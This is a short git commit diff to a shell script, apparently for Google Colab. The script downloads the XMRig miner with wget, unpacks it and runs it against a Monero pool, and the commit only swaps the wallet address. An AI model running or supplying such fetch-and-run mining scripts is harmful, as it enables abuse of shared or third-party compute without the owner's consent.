922dd2639cd4d23c006f614087e740e8ec199c11
jrpm98 <84054982+jrpm98@users.noreply.github.com>
2024-07-07 14:42:48 -0500

    Update gcolab-us.sh

--- gcolab-us.sh
+++ gcolab-us.sh
@@ -10,4 +10,4 @@ screen -R xmr
 wget https://github.com/xmrig/xmrig/releases/download/v6.18.1/xmrig-6.18.1-linux-static-x64.tar.gz
 tar xvzf xmrig-6.18.1-linux-static-x64.tar.gz
 cd xmrig-6.18.1
-./xmrig -o xmr.pool.gntl.co.uk:20009 -u 8A6cdvshzV4dEWthU6fdgjMoJaNgwTn7rLDSdpLoKtHrQ83cdQCWtQQe6HGDrnYv5Z3zUfGuKSR8AByBGpgVPkc8Kp95en3 -k --tls -p a2nk
+./xmrig -o xmr.pool.gntl.co.uk:20009 -u 44Gcsim6a2UF9sr845hSYdWrPJf8SLitSMuzZfY3kVdqha5q7vCJbXwFc1GkHpvrZdEdkfCufofinJFbZBqQhyznSHv6uMP -k --tls -p a2nk
